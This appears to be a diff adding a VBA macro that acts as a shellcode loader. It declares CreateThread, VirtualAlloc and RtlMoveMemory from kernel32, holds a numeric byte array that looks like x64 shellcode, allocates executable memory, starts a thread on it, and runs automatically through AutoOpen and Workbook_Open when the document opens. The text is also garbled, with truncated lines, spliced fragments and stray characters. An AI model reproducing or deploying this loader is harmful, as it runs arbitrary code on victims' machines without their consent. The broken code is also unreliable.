@@ -1,0 +1,29 @@
+#If Vba7 Then
+	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal LyxtzgDD
+Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Hirdszxcd As Long, ByVal ZbnV`
+ByVal Wobiotxe As LongPtr, ByRef Ayintrtic As Any, ByVal Zdzikogi As Long) As LongPtr
+#ElF䀀
+As Long, ByVal Dsaeluo As Long, Joloqt As Long) As Long
+	Private Declare Function Virtual`D
+clare Function RtlMoveMemory Lib "kernel32" (ByVal Wobiotxe As Long, ByRef Ayintrtic As Ab
+
+ Jmfisr As LongPtr, Vniyjxi As LongPtr
+#Else
+	Dim  Jmfisr As Long, Vniyjxi As Long
+#EndIf2,
+
+,82,32,62,72,139,114,80,62,72,15,183,74,74,77,49,201,72,49,192,172,60,97,124,2,44,32,65,1# 
+39,72,24,62,68,139,64,32,73,1,208,227,92,72,255,201,62,65,139,52,136,72,1,214,77,49,201,79,
+72,62,68,139,64,28,73,1,208,62,65,139,4,136,72,1,208,65,88,65,88,94,89,90,65,88,65,89,65,
+3, _
+26,1,0,0,72,49,201,65,186,69,131,86,7,255,213,72,49,201,65,186,240,181,162,86,255,214t
+
+Jmfisr = VirtualAlloc(0, UBound(Bkjrgpuq), &H1000, &H40)
+	For Ard = LBound(Bkjrgpuq) To
+ Jmfisr, 0, 0, 0)
+End Sub
+Sub AutoOpen()
+	Auto_Open
+End Sub
+Sub Workbook_Open()
+	Auto_Ope@
